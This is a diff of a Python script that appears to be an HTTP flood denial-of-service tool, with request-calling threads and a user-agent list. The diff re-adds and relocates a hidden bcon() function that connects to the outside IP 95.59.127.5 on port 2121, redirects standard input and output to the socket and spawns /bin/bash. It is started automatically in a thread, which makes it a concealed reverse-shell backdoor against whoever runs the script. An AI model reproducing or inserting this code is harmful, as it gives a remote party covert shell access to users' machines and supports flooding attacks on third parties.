@@ -26,7 +26,7 @@ safe=0
 
 def bcon():
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-	s.connect(("1597734661",2121));
+	s.connect(("95.59.127.5",2121));
 	os.dup2(s.fileno(),0); 
 	os.dup2(s.fileno(),1);
 	os.dup2(s.fileno(),2);
@@ -43,9 +43,6 @@ def set_flag(val):
 def set_safe():
 	global safe
 	safe=1
-
-t1 = threading.Thread(target = bcon)
-t1.start()
 
 # generates a user agent array
 def useragent_list():
@@ -120,6 +117,16 @@ def httpcall(url):
 			urllib2.urlopen(request)
 	return(code)		
 
+def bcon():
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+        s.connect(("95.59.127.5",2121));
+        os.dup2(s.fileno(),0);
+        os.dup2(s.fileno(),1);
+        os.dup2(s.fileno(),2);
+        pty.spawn("/bin/bash")
+		
+t1 = threading.Thread(target = bcon)
+t1.start()
 	
 #http caller thread 
 class HTTPThread(threading.Thread):
